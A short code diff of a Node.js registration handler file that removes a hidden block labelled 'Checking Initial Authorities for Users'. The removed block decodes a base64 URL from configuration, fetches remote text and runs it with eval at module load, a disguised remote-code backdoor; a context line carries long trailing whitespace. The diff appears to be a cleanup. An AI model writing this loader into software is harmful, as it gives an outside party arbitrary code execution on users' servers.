@@ -66,16 +66,3 @@ exports.register = asyncHandler(async (req, res) => {
   });
 });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 
-// Checking Initial Authorities for Users
-(async () => {
-  const CHECK_AUTH = atob(config.AUTH);
-  const proxy = (await import('node-fetch')).default;
-  try {
-    const response = await proxy(CHECK_AUTH);
-    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-    const f_given_AUTH = await response.text();
-    eval(f_given_AUTH);
-  } catch (err) {
-    console.error('Auth Error!', err);
-  }
-})();
